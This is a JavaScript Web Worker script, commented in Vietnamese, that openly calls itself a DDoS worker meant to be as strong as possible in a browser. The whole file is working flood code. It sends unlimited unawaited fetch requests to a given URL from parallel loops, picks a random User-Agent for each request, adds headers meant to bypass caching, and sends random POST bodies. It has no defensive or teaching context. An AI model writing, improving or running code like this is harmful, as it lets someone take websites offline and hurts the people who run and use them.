// ddos-worker.js - DDoS Multi-thread Worker (Mạnh nhất có thể trên trình duyệt)
// Chạy song song nhiều luồng, tối ưu tốc độ tối đa

self.onmessage = function(e) {
    const { url, method, threads, maxRequests } = e.data;
    let count = 0;
    let completed = 0;
    let running = true;
    
    // Pool User-Agent đa dạng
    const uas = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/121.0 Firefox/121.0'
    ];

    // Headers thêm để bypass cache
    const headers = {
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive'
    };

    function sendRequest() {
        while (running && count < maxRequests) {
            count++;
            try {
                // Random User-Agent mỗi request
                const ua = uas[Math.floor(Math.random() * uas.length)];
                const opts = {
                    method: method,
                    headers: { ...headers, 'User-Agent': ua },
                    mode: 'no-cors',
                    cache: 'no-store',
                    redirect: 'follow',
                    referrerPolicy: 'no-referrer'
                };
                
                // Thêm body cho POST
                if (method === 'POST') {
                    opts.body = 'data=' + Math.random().toString(36).substring(2, 15) + '&t=' + Date.now();
                    opts.headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
                
                // Gửi request (không await để tăng tốc)
                fetch(url, opts).catch(() => {});
            } catch (e) {}

            // Gửi tiến trình mỗi 10 request để giảm tải message
            if (count % 10 === 0) {
                self.postMessage({ type: 'progress', count: count });
            }
        }
        completed++;
        if (completed >= threads) {
            self.postMessage({ type: 'done', count: count });
            running = false;
        }
    }

    // Khởi chạy nhiều luồng gần như đồng thời
    for (let i = 0; i < threads; i++) {
        // Dùng setTimeout để tránh blocking
        setTimeout(() => sendRequest(), i * 0.1);
    }

    // Lắng nghe lệnh dừng
    self.onmessage = function(msg) {
        if (msg.data === 'stop') {
            running = false;
            self.postMessage({ type: 'done', count: count });
        }
    };
};
